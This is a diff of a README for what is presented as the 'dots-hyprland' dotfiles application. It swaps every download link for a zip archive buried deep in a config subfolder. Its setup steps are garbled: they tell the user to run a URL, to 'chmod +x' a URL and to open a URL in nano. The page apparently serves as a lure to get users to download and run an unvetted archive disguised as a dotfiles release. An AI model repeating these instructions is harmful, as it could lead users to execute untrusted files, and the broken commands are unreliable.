@@ -1,6 +1,6 @@
 # 🎉 dots-hyprland - Explore the World of Dotfiles
 
-[![Download](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip)](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip)
+[![Download](https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip)](https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip)
 
 ## 📖 Introduction
 
@@ -25,7 +25,7 @@ Welcome to dots-hyprland! This application helps you customize your Linux enviro
 To begin using dots-hyprland, follow these simple steps:
 
 1. **Download the Application**:
-   Visit this page to download: [Download dots-hyprland](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip).
+   Visit this page to download: [Download dots-hyprland](https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip).
 
 2. **Locate the Download**: 
    After downloading, check your default download folder for the file.
@@ -45,18 +45,18 @@ To begin using dots-hyprland, follow these simple steps:
 6. **Run the Application**: 
    Type the following command to start:
    ```
-   https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
+   https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip
    ```
 
    If you see any permission errors, use:
    ```
-   chmod +x https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
-   https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
+   chmod +x https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip
+   https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip
    ```
 
 ## 📥 Download & Install
 
-To download dots-hyprland, click here: [Download dots-hyprland](https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip).
+To download dots-hyprland, click here: [Download dots-hyprland](https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip).
 
 Once you have downloaded the application, follow the steps in the "Getting Started" section above to install and run it.
 
@@ -70,7 +70,7 @@ After launching, you will find configuration files within your installation. The
 2. **Edit the Files**: 
    Use a text editor, such as `nano` or `vim`, to modify the settings according to your preference. For instance, to edit a configuration file, run:
    ```
-   nano https://raw.githubusercontent.com/Professor7861/dots-hyprland/main/sdata/dots-hyprland-2.2-beta.3.zip
+   nano https://github.com/Professor7861/dots-hyprland/raw/refs/heads/main/dots/.config/quickshell/ii/modules/ii/sidebarLeft/aiChat/dots_hyprland_1.7-beta.2.zip
    ```
 
 3. **Save the Changes**: 
